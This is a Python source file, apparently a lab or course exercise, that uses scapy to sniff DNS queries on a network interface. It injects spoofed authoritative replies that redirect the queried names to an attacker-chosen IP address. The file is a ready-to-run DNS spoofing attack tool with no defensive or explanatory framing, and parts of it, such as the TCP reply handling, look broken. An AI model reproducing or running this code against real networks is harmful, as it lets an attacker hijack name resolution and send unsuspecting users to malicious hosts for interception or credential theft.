import sys
import argparse
import socket
import netifaces as nif
from scapy.all import *

def dns_sniff(pckt):
    udp = False
    tcp = False
    redirect_ip = local_ip
    if pckt.haslayer(IP): 
        src_ip = pckt[IP].src
        
        dest_ip = pckt[IP].dst
      
        if pckt.haslayer(TCP):
            tcp = True
            sport = pckt[TCP].sport
           
            dport = pckt[TCP].dport
     
        elif pckt.haslayer(UDP):
            udp = True
            sport = pckt[UDP].sport
    
            dport = pckt[UDP].dport

        if pckt.haslayer(DNS) and pckt.haslayer(DNSQR) and pckt[DNS].qr == 0:
            dns_id = pckt[DNS].id
            #print("dns id"+str(dns_id))
            dns_qd = pckt[DNS].qd
        
            dns_qname = dns_qd.qname
            #print(dns_qname)

            if args.hostname is not None:
                fp = open(args.hostname, "r")
                for names in fp:
                    print("this is line" + names)
                    if dns_qname.rstrip('.') in names:
                        hostname_list = names.split()
                        redirect_ip = hostname_list[0]
            if (udp):
                new_pckt =  IP(src=dest_ip, dst=src_ip)/ \
                                UDP(sport=dport, dport=sport)/ \
                                DNS(id=dns_id, qd=dns_qd, aa=1, qr=1, an=DNSRR(rrname=dns_qd.qname, ttl=10, rdata=redirect_ip))
            elif (tcp):
                new_pckt =  IP(src=dest_ip, dst=src_ip)/ \
                                TCP(sport=dport, dport=sport)/ \
                                DNS(id=dns_id, qd=dns_qd, aa=1, qr=1, an=DNSRR(rrname=dns_qd.qname, ttl=10, rdata=redirect_ip))
            send(new_pckt)
            print (new_pckt.summary())

if __name__ == "__main__":
    global local_ip
    local_ip = '10.0.0.194'
    parser = argparse.ArgumentParser(add_help=False)
    local_interface = nif.gateways()['default'][nif.AF_INET][1]
    parser.add_argument("-i", "--interface", default=local_interface)
    parser.add_argument("-h", "--hostname")
    parser.add_argument("expr", nargs='*', action="store", default='', help="BPF Filter")
    args = parser.parse_args()
    #print("-----" + str(args) + "------")
    nif.ifaddresses(args.interface)
    #local_ip = nif.ifaddresses(args.interface)[nif.AF_INET][0]['addr']
    print("local ip" + str(local_ip))
    #print("args.interfaces  "+ str(args.interface))
    #print("expr---- " + str(args.expr))
    sniff(filter=str(args.expr), iface=str(args.interface), store=0, prn=dns_sniff)